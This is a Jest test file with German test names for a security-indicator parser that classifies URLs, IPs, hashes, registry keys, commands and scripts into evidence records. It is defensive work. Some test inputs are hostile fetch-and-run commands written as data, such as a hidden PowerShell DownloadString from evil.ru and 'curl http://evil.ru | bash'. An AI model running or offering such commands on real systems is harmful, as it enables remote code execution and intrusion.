'use strict';

const { smartParse, parsedToEvidence } = require('../../src/domain/smartParse');

// ─── smartParse — Prioritätskette ───────────────────────────────────────────

describe('smartParse — URL', () => {
  it('erkennt HTTP-URL', () => {
    const r = smartParse('https://malicious.example.com/payload.exe', 'manual');
    expect(r.type).toBe('URL');
    expect(r.fields.url).toBe('https://malicious.example.com/payload.exe');
    expect(r.iocs.length).toBeGreaterThan(0);
    expect(r.iocs[0].type).toBe('url');
  });

  it('erkennt FTP-URL', () => {
    const r = smartParse('ftp://files.evil.ru/drop.zip', 'manual');
    expect(r.type).toBe('URL');
  });

  it('fügt Hinweis auf verdächtige Dateiendung hinzu', () => {
    const r = smartParse('https://evil.ru/update.exe', 'manual');
    expect(r.fields.notes).toMatch(/exe/i);
  });

  it('extrahiert Host-Zeile in notes', () => {
    const r = smartParse('https://evil.ru/path?x=1', 'manual');
    expect(r.fields.notes).toMatch(/Host:/);
  });
});

describe('smartParse — IPv4', () => {
  it('erkennt öffentliche IP', () => {
    const r = smartParse('185.220.101.5', 'manual');
    expect(r.type).toBe('IP');
    expect(r.fields.ip).toBe('185.220.101.5');
    expect(r.iocs.some((i) => i.type === 'ip')).toBe(true);
  });

  it('erkennt private IP mit Hinweis', () => {
    const r = smartParse('192.168.241.100', 'manual');
    expect(r.type).toBe('IP');
    expect(r.fields.notes).toMatch(/Privates Netz/);
  });

  it('erkennt IP mit Port', () => {
    const r = smartParse('10.0.0.1:443', 'manual');
    expect(r.type).toBe('IP');
    expect(r.fields.ip).toBe('10.0.0.1');
    expect(r.fields.notes).toMatch(/Port: 443/);
  });

  it('IP wird NICHT als Domain erkannt', () => {
    const r = smartParse('1.2.3.4', 'manual');
    expect(r.type).toBe('IP');
  });
});

describe('smartParse — Email', () => {
  it('erkennt E-Mail-Adresse', () => {
    const r = smartParse('phishing@fake-bank.de', 'manual');
    expect(r.type).toBe('Email');
    expect(r.fields.sender).toBe('phishing@fake-bank.de');
    expect(r.iocs.length).toBeGreaterThan(0);
  });

  it('Typosquatting-Hinweis bei paypa1', () => {
    const r = smartParse('user@paypa1.com', 'manual');
    expect(r.type).toBe('Email');
    expect(r.fields.notes).toMatch(/Typosquatting/i);
  });
});

describe('smartParse — Registry-Key', () => {
  it('erkennt HKCU-Pfad', () => {
    const r = smartParse('HKCU\\Software\\Microsoft\\Windows\\Run\\updater', 'manual');
    expect(r.type).toBe('Registry-Key');
    expect(r.iocs.some((i) => i.type === 'other')).toBe(true);
  });

  it('Persistence-Hinweis bei Run-Pfad', () => {
    const r = smartParse('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\evil', 'manual');
    expect(r.type).toBe('Registry-Key');
    expect(r.fields.notes).toMatch(/Persistence/i);
  });

  it('erkennt HKEY_LOCAL_MACHINE-Langform', () => {
    const r = smartParse('HKEY_LOCAL_MACHINE\\System\\CurrentControlSet', 'manual');
    expect(r.type).toBe('Registry-Key');
  });
});

describe('smartParse — Hash', () => {
  it('erkennt MD5-Hash (32 Zeichen)', () => {
    const r = smartParse('d41d8cd98f00b204e9800998ecf8427e', 'manual');
    expect(r.type).toBe('Hash');
    expect(r.fields.algo).toBe('MD5');
    expect(r.fields.vt).toMatch(/virustotal/);
    expect(r.iocs.some((i) => i.type === 'hash')).toBe(true);
  });

  it('erkennt SHA1-Hash (40 Zeichen)', () => {
    const r = smartParse('da39a3ee5e6b4b0d3255bfef95601890afd80709', 'manual');
    expect(r.type).toBe('Hash');
    expect(r.fields.algo).toBe('SHA1');
  });

  it('erkennt SHA256-Hash (64 Zeichen)', () => {
    const r = smartParse('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', 'manual');
    expect(r.type).toBe('Hash');
    expect(r.fields.algo).toBe('SHA256');
    expect(r.fields.vt).toMatch(/virustotal/);
  });

  it('erkennt SHA512-Hash (128 Zeichen)', () => {
    // Echter SHA512 ist 128 Hex-Zeichen
    const sha512 = 'cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e';
    expect(sha512.length).toBe(128);
    const r = smartParse(sha512, 'manual');
    expect(r.type).toBe('Hash');
    expect(r.fields.algo).toBe('SHA512');
  });

  it('kein Hash bei 127 Hex-Zeichen (falsche Länge)', () => {
    // 127 Zeichen — kein SHA512 (passt zu keiner Hash-Länge)
    const r = smartParse('a'.repeat(127), 'manual');
    expect(r.type).not.toBe('Hash');
  });
});

describe('smartParse — Domain', () => {
  it('erkennt Domain', () => {
    const r = smartParse('evil-domain.ru', 'manual');
    expect(r.type).toBe('Domain');
    expect(r.fields.domain).toBe('evil-domain.ru');
    expect(r.iocs.some((i) => i.type === 'domain')).toBe(true);
  });

  it('Hinweis bei verdächtiger TLD .ru', () => {
    const r = smartParse('malware.ru', 'manual');
    expect(r.type).toBe('Domain');
    expect(r.fields.notes).toMatch(/TLD/i);
  });

  it('IP wird NICHT als Domain erkannt', () => {
    // IP darf nie als Domain klassifiziert werden
    const r = smartParse('1.2.3.4', 'manual');
    expect(r.type).toBe('IP');
    expect(r.type).not.toBe('Domain');
  });
});

describe('smartParse — File-Pfad', () => {
  it('erkennt Windows-Dateipfad', () => {
    const r = smartParse('C:\\Users\\jdoe\\AppData\\Temp\\malware.exe', 'manual');
    expect(r.type).toBe('File');
    expect(r.fields.filename).toMatch(/malware\.exe/);
    expect(r.iocs.some((i) => i.type === 'file')).toBe(true);
  });

  it('Hinweis bei .exe', () => {
    const r = smartParse('C:\\Windows\\System32\\evil.exe', 'manual');
    expect(r.type).toBe('File');
    expect(r.fields.notes).toMatch(/Ausführbare/i);
  });

  it('Hinweis bei Temp-Pfad', () => {
    const r = smartParse('C:\\Users\\jdoe\\AppData\\Local\\Temp\\drop.ps1', 'manual');
    expect(r.type).toBe('File');
    expect(r.fields.notes).toMatch(/temporär/i);
  });
});

describe('smartParse — Command', () => {
  it('erkennt PowerShell-Befehl', () => {
    const r = smartParse('powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://evil.ru/ps\')"', 'manual');
    expect(r.type).toBe('Command');
    expect(r.fields.cmd).toBeTruthy();
    expect(r.iocs.some((i) => i.type === 'other' || i.type === 'url')).toBe(true);
  });

  it('dekodiert -enc Base64-Payload', () => {
    // echo -n 'whoami' | iconv -t UTF-16LE | base64
    // Echtes PowerShell -enc Beispiel: "whoami" in UTF-16LE Base64
    const raw = 'powershell.exe -enc dwBoAG8AYQBtAGkA';
    const r = smartParse(raw, 'manual');
    expect(r.type).toBe('Command');
    expect(r.fields.notes).toMatch(/Decoded/);
  });

  it('erkennt cmd.exe', () => {
    const r = smartParse('cmd.exe /c whoami && net user', 'manual');
    expect(r.type).toBe('Command');
  });
});

describe('smartParse — Base64', () => {
  it('erkennt Base64-String', () => {
    // "Hello World" in Base64
    const r = smartParse('SGVsbG8gV29ybGQ=', 'manual');
    expect(r.type).toBe('Encoded String');
    expect(r.fields.encoding).toBe('Base64');
    expect(r.fields.decoded).toBeTruthy();
    expect(r.iocs.some((i) => i.type === 'other')).toBe(true);
  });

  it('UTF-16LE PowerShell Base64 wird erkannt', () => {
    // "whoami" UTF-16LE Base64
    const r = smartParse('dwBoAG8AYQBtAGkA', 'manual');
    expect(r.type).toBe('Encoded String');
    expect(r.fields.encoding).toBe('Base64');
  });
});

describe('smartParse — Hex', () => {
  it('erkennt Hex-String (druckbare Zeichen)', () => {
    // "AAAA" in hex
    const r = smartParse('41 41 41 41 41 41 41 41 41 41 41', 'manual');
    expect(r.type).toBe('Encoded String');
    expect(r.fields.encoding).toBe('Hex');
  });
});

describe('smartParse — Script', () => {
  it('erkennt PowerShell-Script', () => {
    const r = smartParse('Invoke-Expression (New-Object Net.WebClient).DownloadString("http://evil")', 'manual');
    expect(r.type).toBe('Script');
    expect(r.fields.lang).toBe('PowerShell');
    expect(r.iocs.length).toBeGreaterThan(0);
  });

  it('erkennt Bash-Script via Shebang', () => {
    const r = smartParse('#!/bin/bash\ncurl http://evil.ru | bash', 'manual');
    expect(r.type).toBe('Script');
    expect(r.fields.lang).toMatch(/Bash/);
  });
});

describe('smartParse — User-Agent', () => {
  it('erkennt Mozilla-UA', () => {
    const r = smartParse('Mozilla/5.0 (compatible; MalBot/1.0)', 'manual');
    expect(r.type).toBe('User-Agent');
    expect(r.fields.ua).toBeTruthy();
    expect(r.iocs.some((i) => i.type === 'other')).toBe(true);
  });

  it('erkennt curl-UA', () => {
    const r = smartParse('curl/7.79.1', 'manual');
    expect(r.type).toBe('User-Agent');
    expect(r.fields.tool).toMatch(/curl/);
  });
});

describe('smartParse — Andere (Fallback)', () => {
  it('gibt Andere zurück bei unbekanntem Inhalt', () => {
    const r = smartParse('Unbekannter Inhalt XY-12345', 'manual');
    expect(r.type).toBe('Andere');
    expect(r.fields.value).toBeTruthy();
    expect(r.iocs).toEqual([]);
  });
});

describe('smartParse — Security-Schutz', () => {
  it('raw-Cap: schneidet bei 20000 Zeichen ab und parst trotzdem', () => {
    const long = 'https://evil.ru/' + 'a'.repeat(25000);
    const r = smartParse(long, 'manual');
    // Kein Fehler, raw wurde gekappt
    expect(r).toBeTruthy();
    expect(r.type).toBeTruthy();
  });

  it('leerer Input ergibt type Andere oder leeres Ergebnis', () => {
    const r = smartParse('', 'manual');
    // Muss fehlerfrei sein, type kann leer oder Andere sein
    expect(r).toBeTruthy();
  });

  it('null-artiger Input wirft keinen Fehler', () => {
    expect(() => smartParse(null, 'manual')).not.toThrow();
    expect(() => smartParse(undefined, 'manual')).not.toThrow();
  });

  it('sehr langer Input ohne URL/IP wird als Andere erkannt ohne Crash', () => {
    const r = smartParse('x'.repeat(30000), 'manual');
    expect(r).toBeTruthy();
  });
});

// ─── parsedToEvidence — Mapper ──────────────────────────────────────────────

describe('parsedToEvidence — Mapper', () => {
  it('mappt URL-ParseResult auf ParsedEvidence-Form', () => {
    const parsed = smartParse('https://evil.ru/payload.exe', 'Wazuh Alert');
    const ev = parsedToEvidence(parsed, 'Wazuh Alert');
    expect(ev.detection.sourceSystem).toBe('Wazuh Alert');
    expect(ev.payload.url).toBe('https://evil.ru/payload.exe');
    expect(ev.payload.type).toBe('URL');
    expect(ev.iocs).toBeInstanceOf(Array);
    expect(ev.id).toBeTruthy();
    expect(ev.type).toBeTruthy();
    expect(ev.detection.timestamp).toBeTruthy();
  });

  it('mappt IP-ParseResult auf ParsedEvidence-Form', () => {
    const parsed = smartParse('185.220.101.5', 'Firewall Log');
    const ev = parsedToEvidence(parsed, 'Firewall Log');
    expect(ev.detection.sourceSystem).toBe('Firewall Log');
    expect(ev.destination.ip).toBe('185.220.101.5');
    expect(ev.iocs.some((i) => i.type === 'ip')).toBe(true);
  });

  it('mappt Hash-ParseResult auf ParsedEvidence-Form', () => {
    const parsed = smartParse('d41d8cd98f00b204e9800998ecf8427e', 'manual');
    const ev = parsedToEvidence(parsed, 'manual');
    expect(ev.payload.type).toBe('Hash');
    expect(ev.iocs.some((i) => i.type === 'hash')).toBe(true);
  });

  it('mappt Email-ParseResult auf ParsedEvidence-Form', () => {
    const parsed = smartParse('phisher@evil.com', 'Paste Raw Log');
    const ev = parsedToEvidence(parsed, 'Paste Raw Log');
    expect(ev.detection.sourceSystem).toBe('Paste Raw Log');
    expect(ev.source.user).toBe('phisher@evil.com');
    expect(ev.payload.type).toBe('Email');
  });

  it('mappt Registry-Key-ParseResult auf ParsedEvidence-Form', () => {
    const parsed = smartParse('HKCU\\Software\\Microsoft\\Windows\\Run\\evil', 'manual');
    const ev = parsedToEvidence(parsed, 'manual');
    expect(ev.payload.type).toBe('Registry-Key');
    expect(ev.iocs.length).toBeGreaterThan(0);
  });

  it('füllt iocs korrekt aus ParsedEvidence', () => {
    const parsed = smartParse('https://evil.ru/drop.exe', 'manual');
    const ev = parsedToEvidence(parsed, 'manual');
    const urlIoc = ev.iocs.find((i) => i.type === 'url');
    expect(urlIoc).toBeTruthy();
    expect(urlIoc.value).toBe('https://evil.ru/drop.exe');
  });

  it('id ist immer gesetzt', () => {
    const parsed = smartParse('8.8.8.8', 'manual');
    const ev = parsedToEvidence(parsed, 'manual');
    expect(ev.id).toBeTruthy();
    expect(typeof ev.id).toBe('string');
  });

  it('timestamp ist ISO-String', () => {
    const parsed = smartParse('1.2.3.4', 'manual');
    const ev = parsedToEvidence(parsed, 'manual');
    expect(() => new Date(ev.detection.timestamp)).not.toThrow();
    expect(isNaN(new Date(ev.detection.timestamp).getTime())).toBe(false);
  });
});
